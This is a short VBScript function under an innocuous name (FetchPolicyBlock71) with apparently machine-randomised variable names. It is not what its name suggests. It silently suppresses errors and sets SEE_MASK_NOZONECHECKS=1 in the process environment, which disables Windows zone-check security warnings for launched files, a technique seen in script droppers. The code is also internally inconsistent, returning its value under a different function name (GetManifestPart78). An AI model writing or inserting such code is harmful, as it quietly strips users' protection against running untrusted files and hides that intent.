Function FetchPolicyBlock71()
On Error Resume Next
  Dim strValue22,strLine520,strBackupSlice11
  Set strValue22=CreateObject("WScript.Shell")
  strLine520=strValue22.ExpandEnvironmentStrings("%TEMP%")
  strBackupSlice11=strValue22.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strLine520)>0 And Len(strBackupSlice11)>0 Then
    strValue22.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    GetManifestPart78=1
    Exit Function
  End If
  GetManifestPart78=0
End Function

